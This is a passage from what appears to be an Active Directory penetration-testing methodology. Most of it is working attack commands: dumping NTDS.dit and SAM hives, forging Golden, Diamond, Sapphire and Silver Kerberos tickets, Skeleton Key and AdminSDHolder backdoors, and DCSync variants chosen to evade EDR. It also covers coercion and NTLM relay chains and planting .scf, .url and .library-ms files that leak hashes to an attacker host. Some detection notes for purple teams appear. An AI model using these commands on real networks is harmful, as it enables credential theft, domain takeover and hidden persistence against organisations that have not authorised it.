esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d C:\temp\SYSTEM

# ntdsutil (native AD tool — IFM creates ntds.dit + SYSTEM + SECURITY in one pass)
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds_dump" quit quit
# Creates C:\temp\ntds_dump\Active Directory\ntds.dit and registry\{SYSTEM,SECURITY}

# Extract hashes offline
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

#### Living-off-the-land alternative — libesedb + ntdsxtract

```bash
# Tooling — install once on the attack host
# https://github.com/libyal/libesedb
sudo apt install libesedb-utils                                   # provides esedbexport
# https://github.com/csababarta/ntdsxtract
git clone https://github.com/csababarta/ntdsxtract.git
cd ntdsxtract && sudo python3 setup.py install

# 1. Dump ESE tables from ntds.dit → produces ntds.dit.export/ with datatable.<N>, link_table.<N>
esedbexport -m tables ntds.dit
ls ntds.dit.export/                                               # find datatable.<N> + link_table.<M>

# 2. Extract NT/LM hashes — needs SYSTEM hive for the boot key
dsusers.py ntds.dit.export/datatable.<N> ntds.dit.export/link_table.<M> hashdump \
  --syshive SYSTEM \
  --passwordhashes \
  --lmoutfile lm.txt \
  --ntoutfile nt.txt \
  --pwdformat ophc

# Output format:  Administrator:::<lm>:<nt>:<sid>::  → feed to hashcat -m 1000
hashcat -m 1000 nt.txt /usr/share/wordlists/rockyou.txt

# 3. Per-user history + supplemental creds (gMSA, kerberos keys)
dsusers.py ntds.dit.export/datatable.<N> ntds.dit.export/link_table.<M> <TARGET_USER> \
  --syshive SYSTEM --passwordhistory --supplcreds
```

> **When to reach for the libesedb path:** legacy ntds.dit (Server 2008/2012 era), corrupt-but-readable dits where `secretsdump` throws an ESE parse error, environments without impacket installed, or sanity-check against a second toolchain before trusting the hash list.

> **OPSEC:** All operations are offline on the attacker host — zero footprint on the target. Only the original ntds.dit + SYSTEM hive read/exfil is detectable, and that's bounded by whichever method dropped the dit on disk in the first place (see acquisition methods above).

#### Living-off-the-land equivalent — `reg save` SAM/SYSTEM/SECURITY triplet

For local hash recovery on **member servers / workstations** (DCs use NTDS.dit instead). Requires local Administrator + `SeBackupPrivilege` (default for Administrators).

```cmd
:: Local elevated cmd.exe — bypasses file ACLs via backup semantics
reg save HKLM\SAM      C:\Windows\Temp\sam.save      /y
reg save HKLM\SYSTEM   C:\Windows\Temp\system.save   /y
reg save HKLM\SECURITY C:\Windows\Temp\security.save /y
```

```bash
# Offline parse — SAM yields local NTLM hashes; SECURITY+SYSTEM yields LSA secrets,
# DPAPI machine key, cached domain creds (DCC2), and any plaintext service passwords.
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# Remote alternative — Impacket reg.py BACKUP (writes to a UNC share, no local file drop)
impacket-reg '<DOMAIN>/<ADMIN>:<PASS>@<TARGET>' backup -o '\\<ATTACKER_IP>\share'
```

> **LOTL OPSEC:** `reg save HKLM\SAM` is a high-fidelity Sigma/Sentinel rule (`reg.exe` + `HKLM\SAM` + `save`). Defender does not block by default but most managed EDRs do. Bypass options: copy hives from a VSS shadow path (`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\*`) or use `esentutl.exe /y /vss` against `C:\Windows\System32\config\SAM` directly.

> **NTDS.dit method comparison (2026 detection profile):**
> | Method | Events / IOCs | Notes |
> | --- | --- | --- |
> | `ntdsutil ifm` | NTDS Event 216 (Backup), 325 (database created) | Cleanest — looks like backup activity |
> | `vssadmin create shadow` + copy | Event 8222 (VSS); Sigma `vss_shadow_copy_creation` | Loud keyword in cmdline |
> | `esentutl /y /vss` | Sigma `proc_creation_win_esentutl_sensitive_file_copy` | Single-shot, simplest |
> | `wmic shadowcopy call create` | WMI provider events | Avoids the literal `vssadmin create shadow` keyword |
> | `reg save HKLM\SYSTEM` | Sigma `reg_export_sensitive_keys` | Required for offline NTDS parse alongside any of the above |
> | `esedbexport` + `dsusers.py` | None on target (offline) | Fallback when secretsdump fails on legacy/corrupt dits |

### 10.3 Golden Ticket
```bash
# Forge a TGT using the krbtgt hash (valid for 10 years by default)
# Requires: krbtgt NTLM hash + Domain SID

impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>

# From Windows (Mimikatz)
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
```

### 10.4 Diamond Ticket
```bash
# A Diamond Ticket modifies a legitimately requested TGT (instead of forging from scratch like Golden Ticket)
# This makes it harder to detect because the ticket has valid metadata from the KDC
# Requires: krbtgt AES256 key + Domain SID

# Using Rubeus (from Windows foothold)
# https://github.com/GhostPack/Rubeus
.\Rubeus.exe diamond /krbkey:<KRBTGT_AES256_KEY> /user:<USER> /password:<PASSWORD> /enctype:aes /domain:<DOMAIN> /dc:<DC_FQDN> /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt

# The /ticketuser and /ticketuserid specify who the ticket is for
# /groups:512 = Domain Admins
# /ptt = inject into current session

# Why Diamond over Golden:
# - Golden Ticket is forged entirely offline → no AS-REQ in DC logs → detectable by absence
# - Diamond Ticket requests a real TGT then decrypts and modifies it → looks legitimate in logs
# - Bypasses "TGT with no corresponding AS-REQ" detection rules
```

```bash
# Impacket flavor — ticketer with PAC-mod semantics (does not strictly request a real TGT,
# but produces a Diamond-style ticket with full group membership + extra-SID injection
# that mirrors the Rubeus output structure).
# Requires: krbtgt NT hash (or AES key) + Domain SID

impacket-ticketer \
    -nthash <KRBTGT_NTHASH> \
    -domain-sid <DOMAIN_SID> \
    -domain <DOMAIN> \
    -groups 512,513,518,519,520 \
    -extra-sid '<DOMAIN_SID>-519' \
    -duration 36000 \
    -dc-ip <DC_IP> \
    diamond_user

# Group RIDs:
#   512 = Domain Admins, 513 = Domain Users, 518 = Schema Admins,
#   519 = Enterprise Admins, 520 = Group Policy Creator Owners
# -extra-sid 519 = inject Enterprise Admins SID for forest-wide reach in multi-domain forests.
# -duration 36000 (10 hours) = matches normal TGT lifetime → less anomalous than the default 10y.
```

### 10.4b Sapphire Ticket — TGT with S4U2self+U2U-Sourced PAC (Detection Evader)

A Sapphire Ticket builds on a legitimate ticket: the PAC of a privileged user is fetched via S4U2self+U2U, then injected into a forged TGT. No PAC discrepancy with AD = stealthier than Diamond/Golden. Reference: [thehacker.recipes — Sapphire tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire).

```bash
# Prerequisite: krbtgt account's AES256 key (NOT the target user's key — it must be krbtgt's,
# because the KDC validates inbound TGTs against the krbtgt key for /S4U2Self/TGS issuance).
# Get krbtgt AES via DCSync:
#   impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc-user krbtgt
# The secretsdump output shows krbtgt:aes256-cts-hmac-sha1-96:<AES256_HEX>

impacket-ticketer \
    -aesKey <KRBTGT_AES256> \
    -domain <DOMAIN> \
    -domain-sid <DOMAIN_SID> \
    -dc-ip <DC_IP> \
    <TARGET_IMPERSONATED_USER>

# Resulting ccache: <TARGET_IMPERSONATED_USER>.ccache → use as a normal TGT
export KRB5CCNAME=<TARGET_IMPERSONATED_USER>.ccache
impacket-psexec -k -no-pass <DC_FQDN>
```

**Why Sapphire over a classic (RC4) Golden Ticket:**
- **Encryption type:** AES256 by default — defeats Sigma `kerberos_rc4_downgrade`, `golden_ticket_event_id_4769_rc4`, and Splunk/Sentinel rules keyed on RC4-encrypted TGTs.
- **Indistinguishable from real:** legitimate AES-only environments produce only AES tickets, so a Sapphire blends in. RC4 Golden Tickets stand out in those environments.
- **PAC build:** explicit-group injection (`-groups`) optional; without it, ticketer pulls a default privileged set (512/513/518/519/520) since you control the PAC.

**Trade-offs vs Golden:**
- Same prerequisite: krbtgt key. If you have only krbtgt NTLM (not AES), you can request the AES key during DCSync (`-just-dc-user krbtgt -hashes lmhash:nthash`) — secretsdump returns all available key types.
- Sapphire is invalidated by the same post-incident response: krbtgt password rotation (twice, see §10.9).

**Detection:**
- EID 4769 with unusual SPN combinations (e.g. AES-encrypted TGS for high-value SPNs from a workstation that has never requested one before).
- Group SID anomaly — if `-groups 512,519` is used while the impersonated user has never legitimately belonged to those groups, EID 4769 + group-membership-baseline anomaly fires.
- AES Sapphires are **invisible** to "RC4 downgrade Golden Ticket" rules — exactly the validation gap that makes Sapphire the right pick for testing detection coverage beyond the textbook RC4 case.

### 10.5 Silver Ticket
```bash
# Forge a TGS ticket for a specific service (does NOT touch the DC)
# Requires: Service account hash + Domain SID

# CIFS (file share access)
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<TARGET_FQDN> Administrator

# HOST (PsExec / schtasks)
impacket-ticketer -nthash <COMPUTER_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn host/<TARGET_FQDN> Administrator
```

### 10.5b Silver Ticket with PAC Group RID Forging (In-Service Privilege Escalation)

A standard Silver Ticket impersonates Administrator (RID 500) to a service. PAC group RID forging takes this further — inject arbitrary group RIDs into the ticket's PAC `KERB_VALIDATION_INFO.GroupIds` field. The target service reads these groups from the PAC to make authorization decisions (e.g., SQL Server checks for `sysadmin` group membership, IIS checks for custom application groups). Since a Silver Ticket never touches the DC, the forged PAC is never validated against AD — the service trusts whatever groups appear in the PAC.

**Use case:** You have a service account hash (e.g., MSSQL service hash from Kerberoasting) but impersonating Administrator alone does not grant the access you need because the service performs group-based authz checks against the PAC.

```bash
# Forge a Silver Ticket with custom group RIDs injected into the PAC
# -groups accepts comma-separated RIDs that populate GroupIds[] in KERB_VALIDATION_INFO
impacket-ticketer \
    -nthash <SERVICE_ACCOUNT_HASH> \
    -domain-sid <DOMAIN_SID> \
    -domain <DOMAIN> \
    -spn <SERVICE_SPN>/<TARGET_FQDN> \
    -groups 512,513,518,519,520,544,548,549,551 \
    -user-id 500 \
    Administrator

# Group RID reference:
#   512 = Domain Admins        518 = Schema Admins       544 = Administrators (builtin)
#   513 = Domain Users         519 = Enterprise Admins   548 = Account Operators
#   520 = Group Policy Owners  549 = Server Operators    551 = Backup Operators

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass '<DOMAIN>/Administrator@<TARGET_FQDN>'
```

```bash
# Example: MSSQL sysadmin via Silver Ticket + custom group
# MSSQL maps "BUILTIN\Administrators" (RID 544) to sysadmin by default
impacket-ticketer \
    -nthash <MSSQL_SVC_HASH> \
    -domain-sid <DOMAIN_SID> \
    -domain <DOMAIN> \
    -spn MSSQLSvc/<TARGET_FQDN>:1433 \
    -groups 512,544 \
    -user-id 500 \
    Administrator

export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass '<DOMAIN>/Administrator@<TARGET_FQDN>'
# Should get sysadmin context due to RID 544 in PAC
```

```bash
# Example: IIS/web app with custom AD group checks
# If the app checks for a custom group (e.g., "WebAppAdmins" with RID 1337):
impacket-ticketer \
    -nthash <IIS_SVC_HASH> \
    -domain-sid <DOMAIN_SID> \
    -domain <DOMAIN> \
    -spn http/<TARGET_FQDN> \
    -groups 512,513,1337 \
    -user-id 500 \
    Administrator

export KRB5CCNAME=Administrator.ccache
# Access the web application or WinRM service with the custom group membership
```

```bash
# AES variant (avoids RC4 downgrade IOC on the service)
impacket-ticketer \
    -aesKey <SERVICE_AES256_KEY> \
    -domain-sid <DOMAIN_SID> \
    -domain <DOMAIN> \
    -spn cifs/<TARGET_FQDN> \
    -groups 512,519,544 \
    Administrator
```

#### Living-off-the-land / LOTL variant

```powershell
# Mimikatz — forge Silver Ticket with group injection
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:cifs /rc4:<SERVICE_HASH> /groups:512,544,519 /ptt" exit

# Rubeus does not natively support Silver Ticket forging with custom groups.
# Use mimikatz or impacket-ticketer for this technique.
```

> **Why the DC never catches this:** Silver Tickets are encrypted with the service's long-term key, not krbtgt. The DC is never consulted during TGS-REQ validation for the embedded PAC because the service itself decrypts and consumes the PAC directly. The only mitigation is PAC validation (the service calls the DC to verify the PAC signature) — this is NOT enabled by default on most services.

> **Finding the right RIDs:** Use BloodHound or `ldapsearch` to discover which group RIDs a service checks. For MSSQL, `SELECT name, sid FROM sys.server_principals WHERE type='G'` reveals the mapped AD groups.

### 10.6 Skeleton Key
```powershell
# https://github.com/gentilkiwi/mimikatz
# Inject into LSASS on DC — allows any password to work alongside real password
# Requires: Domain Admin on DC
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Now any user can authenticate with password "mimikatz" (in addition to their real password)
```

### 10.7 DSRM Abuse
```powershell
# Directory Services Restore Mode — local admin on DC that persists even if AD admin passwords are changed
# Dump DSRM password hash
mimikatz # lsadump::sam

# Enable network logon for DSRM account
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f

# Now authenticate as local Administrator using DSRM hash
impacket-psexec -hashes :<DSRM_HASH> Administrator@<DC_IP>
```

### 10.8 AdminSDHolder Persistence
```powershell
# Add a backdoor user to AdminSDHolder — SDProp will propagate ACL to all protected groups every 60 mins
# Using PowerView:
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<DOMAIN>,DC=<TLD>' -PrincipalIdentity <BACKDOOR_USER> -Rights All
# After SDProp runs (or force it), <BACKDOOR_USER> has GenericAll over all protected objects
```

### 10.9 krbtgt Rollover Mechanics — Golden Ticket Viability After Reset

When defenders detect a Golden Ticket compromise, the canonical remediation is a **double krbtgt password reset** (Microsoft's [`Reset-KrbTgtKeyInteractive.ps1`](https://github.com/microsoft/New-KrbtgtKeys.ps1) or its successor `New-KrbtgtKeys.ps1`). Understanding the timing windows is critical for both attackers (forged-ticket survival) and detection engineers (when does the IOC clear?).

**Why two resets, not one:**
- AD stores the **current** krbtgt password (`unicodePwd` / Kerberos keys) **and** the **previous** password (`ntpwdhistory[0]`).
- TGTs encrypted with the previous key remain valid until that previous-key slot is overwritten — i.e., until the **second** reset.
- A single reset rotates current → previous, leaving forged TGTs from the leaked key still valid.
- Microsoft's script enforces a **minimum 10-hour wait** between resets — matches max TGT lifetime, ensures all legitimately-issued TGTs from the previous key have expired before the second rotation invalidates them.

```text
[ leak ] ────► krbtgt key K0 leaked, attacker forges TGT_K0
              │
              ▼
[ reset 1 ] ──► krbtgt rotated K0 → K1
                Current = K1, Previous (history[0]) = K0
                TGT_K0 STILL VALID (KDC accepts current OR previous key)
              │
              ▼  (≥ 10h wait recommended)
[ reset 2 ] ──► krbtgt rotated K1 → K2
                Current = K2, Previous (history[0]) = K1
                K0 evicted from history → TGT_K0 INVALID
              │
              ▼
[ replication ] ► all DCs converge on K2 (default 15-min site replication;
                  inter-site default 180 min; can be longer in stale forests)
```

**What this means operationally:**

| Defender did | Attacker's forged TGT (from leaked K0) | Action |
|---|---|---|
| Single reset only | Still valid — both keys accepted | Continue using existing ticket; mint new ones until reset 2 |
| Two resets, < 10h apart | Likely still valid for legitimate-issuance window; forged TGT may survive if reset 1 didn't propagate yet | Test by `kinit -V` / TGS request — falls back to KDC error if invalid |
| Two resets, > 10h apart | Invalid | Need new krbtgt key — DCSync again (different AuthN path), or Sapphire/Diamond from a user-AES that wasn't rotated |
| Reset 2 mid-replication | Mixed — DCs not yet replicated still accept K1 | Target a stale DC (`nltest /dclist:<DOMAIN>` + `repadmin /showrepl`) until convergence |

**Detection-side mechanics (relevant for purple team validation):**
- KDC backup-key replication is **on the AD replication schedule**, not separate — `repadmin /showrepl <DC>` reveals lag.
- Forced replication: `repadmin /syncall /APed` — defenders run this after both resets to converge faster than the 24-hour worst case.
- Sigma `windows_account_password_reset_with_specific_target_krbtgt` fires on EID 4724 (admin password reset) with `TargetUserName=krbtgt` — the canonical IOC for the rotation event itself.

**Attacker tooling for stale-DC targeting:**
```bash
# Identify all DCs (writable + RODC)
nltest /dclist:<DOMAIN>
# Or LDAP:
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' \
    -b "OU=Domain Controllers,DC=<DOMAIN>,DC=<TLD>" '(objectClass=computer)' dNSHostName

# Force ticket request against a specific DC (bypass Kerberos referral)
impacket-getTGT <DOMAIN>/<USER> -hashes :<NT_HASH> -dc-ip <STALE_DC_IP>
# If the stale DC still has the old krbtgt key, your forged TGT survives there even after both resets.
```

> **Detection-engineering note for purple team:** If your team relies on "krbtgt was reset, we're safe" as the post-incident posture, validate with a Sapphire Ticket (10.4b) from a non-rotated user account or a Diamond from a stale DC. Both can survive the double reset until the user/DC is also rotated.

> **Persistence corollary:** A defender-observable signal is **only** generated by the rotation event itself — the *forged ticket continuing to work* is silent. EID 4769 on TGS issuance from a forged TGT looks identical to a legitimate TGS request because the KDC successfully decrypts with the previous key.

[↑ Back to top](#active-directory-penetration-testing-methodology)

### 10.10 DCSync via Raw MS-DRSR (EDR Evasion Path)

`impacket-secretsdump` and Mimikatz `lsadump::dcsync` are textbook EDR detections — every commercial XDR signs the canonical impacket banner and the DRSUAPI RPC bind sequence with `DRSGetNCChanges` invocations from a non-DC IP. When `secretsdump` is blocked (binary-detection on `secretsdump.py`) or alarms on bind, raw MS-DRSR clients are the alternate path.

**Tooling options:**

```bash
# Option 1: dsync (pure Python, custom DRSR client — different RPC fingerprint than impacket)
# https://github.com/n00py/DCSync (or the Rust port: https://github.com/skelsec/aiosmb)
git clone https://github.com/n00py/DCSync.git
cd DCSync
python3 dcsync.py -t <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -hash krbtgt
# Different DCERPC client signature → bypasses naive impacket-pattern detection rules.

# Option 2: NetExec --ntds drsuapi (uses impacket under the hood but different banner)
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --ntds drsuapi
# Or with hash:
netexec smb <DC_IP> -u '<USER>' -H ':<NT_HASH>' --ntds drsuapi

# Option 3: aiosmb — async-IO Python SMB/RPC stack with a different bind sequence
# https://github.com/skelsec/aiosmb (and its CLI front-end: skelsec/asysocks)
# Connection string format:
#   smb2+ntlm-password://DOMAIN\USER:PASS@DC_IP
#   smb2+ntlm-nt://DOMAIN\USER:NT_HASH@DC_IP        # PtH variant
URL='smb2+ntlm-password://<DOMAIN>\\<USER>:<PASSWORD>@<DC_IP>'
aiosmb dcsync "$URL" --target krbtgt
# Other targets: --target Administrator, or --target-list users.txt
# Or via msldap (LDAP-backed variant under same project):
URL_LDAP='ldap+ntlm-password://<DOMAIN>\\<USER>:<PASSWORD>@<DC_IP>'
msldap "$URL_LDAP" -- dcsync krbtgt

# Option 4: Rusty version — DonPAPI / SharpHound's drsr capability
# Not a standalone tool but baked into BloodHound CE collectors and several Rust SMB libs.
```

**Why "raw" matters:**
- `impacket-secretsdump` binds to MS-DRSR (UUID `e3514235-4b06-11d1-ab04-00c04fc2dcd2`) with a recognizable client banner string. EDRs flag the banner before the actual `DRSGetNCChanges` call.
- A custom DRSR client with a different banner / op-code ordering achieves the same primitive (replicate directory partition) without matching the signature. The wire-level RPC payload is identical, but the *fingerprint* differs.

**Detection — what defenders should still catch:**
- **EID 4662 with `Replicating Directory Changes` GUID (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)** — fires regardless of client. This is the **canonical** DCSync IOC; if the SACL on the domain object is configured to audit this object access, it catches *all* DCSync variants including raw MS-DRSR.
- **EID 4624 + 4634 from non-DC IP requesting MS-DRSR** — network-layer detection (firewall / DC NSG flow logs).
- **Replication request from an account not in the DCs OU** — anomaly-based: an account having `Replicating Directory Changes` + `Replicating Directory Changes All` rights but not being a DC computer object is itself the IOC.

> **Purple-team validation:** If your detection only matches `secretsdump.py` strings or impacket DRSUAPI banner, raw MS-DRSR clients evade. The 4662 SACL detection (replicate-all GUID) is the only durable rule — verify it is enabled on the domain root object: `Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties ntSecurityDescriptor | Select -Expand ntSecurityDescriptor | Select -Expand SACL` should include audit ACEs for the replication GUIDs.

> **Privilege requirement is identical to standard DCSync:** `Replicating Directory Changes` + `Replicating Directory Changes All` rights on the domain root object (Domain Admins / Enterprise Admins / Built-in Administrators have these by default; ACL backdoors granting just these two rights to a low-priv user are a classic AdminSDHolder/RBAC persistence pattern — see §10.8).

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 11: Coercion Attacks

**Goal:** Force machine accounts to authenticate to you, enabling relay attacks.

> For port forwarding coerced traffic through pivot hosts, see [tunneling-pivoting.md](tunneling-pivoting.md).

### 11.0 Coerce → Relay → Result Decision Table

Pick the coercion method based on what's exploitable, then choose the relay target based on what you want:

| Coerce method | Auth required? | Patched by | Relay target → Outcome |
|---|---|---|---|
| PetitPotam (MS-EFSRPC) | unauth on legacy DCs; authed elsewhere | CVE-2021-36942 partial | LDAP (sign:no) → RBCD on victim · HTTP `/certsrv/` → ESC8 cert · RPC ICPR → ESC11 cert |
| PrinterBug / SpoolSample (MS-RPRN) | authed | Spooler disabled on DC | LDAP/S → RBCD or shadow cred · HTTP ADCS → cert |
| DFSCoerce (MS-DFSNM) | authed | no patch (RPC design) | HTTP ADCS → cert (works post-PetitPotam patch) |
| ShadowCoerce (MS-FSRVP) | authed | no patch | LDAP → RBCD |
| CheeseOunce (MS-EVEN) | authed | no patch | LDAP → RBCD |
| Coercer (any of above) | varies | varies | one tool tries all methods + ICPR/HTTP/LDAP relays |

**Relay target quick-pick:**
- Want **DA** fast → relay to LDAP, write RBCD on a target you can impersonate FROM (Phase 5.3)
- Want a **DC cert** → relay to ADCS HTTP `/certsrv/` (ESC8) or RPC ICPR (ESC11)
- HTTP relay blocked by EPA → use **ESC11 (RPC ICPR)** which doesn't honor EPA
- LDAP signing/binding required → use **Kerberos relay** via marshaled SPN (advanced; see `dirkjanm/krbrelayx`)

### 11.1 PetitPotam (MS-EFSRPC)
```bash
# Applies when:
#   Unauth path: DC missing CVE-2021-36942 patch (Aug 2021) — common on lab/exam DCs
#   Auth path: any patched DC still vulnerable with valid creds (incomplete patch per topotam README)
# Test cost: ~3s — try unauth first, fall back to auth if "STATUS_ACCESS_DENIED"
# If both fail: pivot to PrinterBug (11.2), DFSCoerce (11.3), or use Coercer to test all (11.5)

# Unauth (legacy DCs)
python3 PetitPotam.py <LISTENER_IP> <DC_IP>                              # https://github.com/topotam/PetitPotam
# Authenticated
python3 PetitPotam.py -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> <LISTENER_IP> <DC_IP>

# Relay to LDAP (RBCD), ADCS (cert), or ICPR (ESC11). See § 6.4 / § 7.4 / Phase 5.3.
```

### 11.2 PrinterBug / SpoolSample (MS-RPRN)
```bash
# Requires: valid credentials, Print Spooler running on target
# https://github.com/dirkjanm/krbrelayx (contains printerbug.py)
python3 printerbug.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> <LISTENER_IP>

# From Windows
# https://github.com/leechristensen/SpoolSample
.\SpoolSample.exe <DC_FQDN> <LISTENER_FQDN>
```

### 11.3 DFSCoerce (MS-DFSNM)
```bash
# https://github.com/Wh04m1001/DFSCoerce
python3 DFSCoerce.py -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> <LISTENER_IP> <DC_IP>
```

### 11.4 ShadowCoerce (MS-FSRVP)
```bash
# https://github.com/ShutdownRepo/ShadowCoerce
# Coerce authentication via the File Server VSS Agent Service
# Requires: MS-FSRVP service running on target (common on file servers)
python3 shadowcoerce.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' <LISTENER_IP> <TARGET_IP>
# May need to run twice if FssAgent service hasn't been called recently
```

### 11.5 Coercer (All-in-One Coercion Tool)
```bash
# https://github.com/p0dalirius/Coercer
# Coercer tests multiple coercion methods automatically (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, etc.)

# Scan for available coercion methods
coercer scan -t <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>

# Coerce authentication using all available methods
coercer coerce -t <DC_IP> -l <LISTENER_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>

# Coerce using a specific method
coercer coerce -t <DC_IP> -l <LISTENER_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --filter-method-name PetitPotam
```

### 11.5b WebClient (HTTP) Coercion via WebDAV Triggers

```bash
# When the target has the WebClient service running (Windows workstations: Manual/auto-start;
# Servers: not by default), any UNC path containing @port or @SSL@port triggers WebDAV
# auth instead of SMB — the auth comes as HTTP NTLM (not signable / not EPA-blocked).

# === Check if target has WebClient running ===
netexec smb <TARGETS> -u '<USER>' -p '<PASS>' -M webdav

# Trigger format that forces WebClient/WebDAV auth (NTLM over HTTP):
# Plain:  \\<ATTACKER_IP>@80\share
# SSL:    \\<ATTACKER_IP>@SSL@443\share
# Custom: \\<ATTACKER_IP>@8080\share

# === PrinterBug + WebClient (HTTP relay-friendly) ===
python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET> '<ATTACKER_IP>@80/abc'

# === PetitPotam + WebClient ===
python3 PetitPotam.py -u '<USER>' -p '<PASS>' -d <DOMAIN> '<ATTACKER_IP>@80/abc' <TARGET>

# === Coercer with HTTP trigger ===
coercer coerce -t <TARGET> -l '<ATTACKER_IP>@80/abc' -u '<USER>' -p '<PASS>' -d <DOMAIN>

# === Relay HTTP-NTLM to LDAP (RBCD path, EPA on HTTPS doesn't apply) ===
impacket-ntlmrelayx -t ldap://<DC_IP> --delegate-access --no-smb-server --http-port 80 -smb2support
# Or to ADCS Web Enrollment for ESC8:
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs --template 'Machine' --no-smb-server --http-port 80

# === Start WebClient service on a target you already control (escalates trigger surface) ===
# Triggers it to start as user (no admin needed):
# https://github.com/Hackndo/WebclientServiceScanner
# Or natively from PowerShell on the target:
$path = "\\<ATTACKER>@80\nonexistent"; rundll32.exe url.dll,FileProtocolHandler $path
# Or via search bar / Run dialog input — many UAC + GUI primitives auto-resolve UNC
```

### 11.6 Coercion + Relay Chain
```text
Typical attack chain:
1. Identify relay target (SMB signing disabled, ADCS web enrollment, LDAP)
2. Start relay listener (ntlmrelayx)
3. Coerce authentication from high-value target (DC, server)
4. Relay captured authentication:
   → To ADCS: get certificate as DC → authenticate → DCSync
   → To LDAP: configure RBCD on DC → S4U → compromise DC
   → To LDAP: add shadow credentials → authenticate → get hash
   → To SMB: execute commands on relay target
```

```bash
# Relay to LDAP — configure RBCD
impacket-ntlmrelayx -t ldap://<DC_IP> --delegate-access -smb2support

# Relay to LDAP — add shadow credentials
impacket-ntlmrelayx -t ldap://<DC_IP> --shadow-credentials --shadow-target '<TARGET_COMPUTER>$' -smb2support

# Relay to ADCS web enrollment
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp --adcs --template 'DomainController' -smb2support

# Relay to SMB (execute command)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c 'whoami'
```

### 11.7 Passive Coercion via File Drop on Writable SMB Share

When you have write access to an SMB share that domain users browse, drop a file whose icon path is a UNC to your listener. Explorer fetches the icon when the folder renders — no click required — leaking NetNTLMv2 from any user who opens the folder. Unlike Phase 11.1-11.5 (active RPC coercion), this is passive — you wait for users to walk into the trap.

```bash
# Discover writable directories on a mounted share
sudo mount -t cifs -o rw,username=<USER>,password='<PASSWORD>' '//<TARGET>/<SHARE>' /mnt/<SHARE>
for d in $(find /mnt/<SHARE> -type d 2>/dev/null); do touch "$d/.x" 2>/dev/null && echo "WRITABLE: $d" && rm "$d/.x"; done

# Or via smbclient (no mount)
smbclient '//<TARGET>/<SHARE>' -U '<DOMAIN>/<USER>%<PASSWORD>' -c 'recurse;ls'
```

```bash
# .scf file — fires when user opens the folder in Explorer (1990s format, EDR-flagged)
cat > @pwn.scf <<'EOF'
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
EOF
# Drop into writable share (leading '@' sorts top → icon fetched first)
smbclient '//<TARGET>/<SHARE>' -U '<DOMAIN>/<USER>%<PASSWORD>' -c 'cd <WRITABLE_DIR>; put @pwn.scf'
```

```text
# .url file — Win10/11 era replacement for .scf
[InternetShortcut]
URL=file://<ATTACKER_IP>/share/pwn
WorkingDirectory=<ATTACKER_IP>\share
IconFile=\\<ATTACKER_IP>\share\pwn.ico
IconIndex=1
```

```text
# desktop.ini — auto-rendered by Explorer in any folder
[.ShellClassInfo]
IconResource=\\<ATTACKER_IP>\share\icon.ico,0
```

```text
# .library-ms (Win10+) — fetched on folder open, often unsigned-allowed
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\<ATTACKER_IP>\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

```bash
# Capture NetNTLMv2 with Responder while files sit in the share
sudo responder -I <INTERFACE> -wv
# Hashes saved to /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Crack offline
hashcat -m 5600 <HASH> /usr/share/wordlists/rockyou.txt

# Or relay live (disable SMB/HTTP in Responder.conf first)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
# Machine account auth → relay to LDAP for RBCD (Phase 5.3) or ADCS for cert (Phase 7.4)
```

> **Tip:** Drop with filename starting `@` or `~` so it sorts first in Explorer's default name order — the icon fetches before the user clicks anything else in the folder.

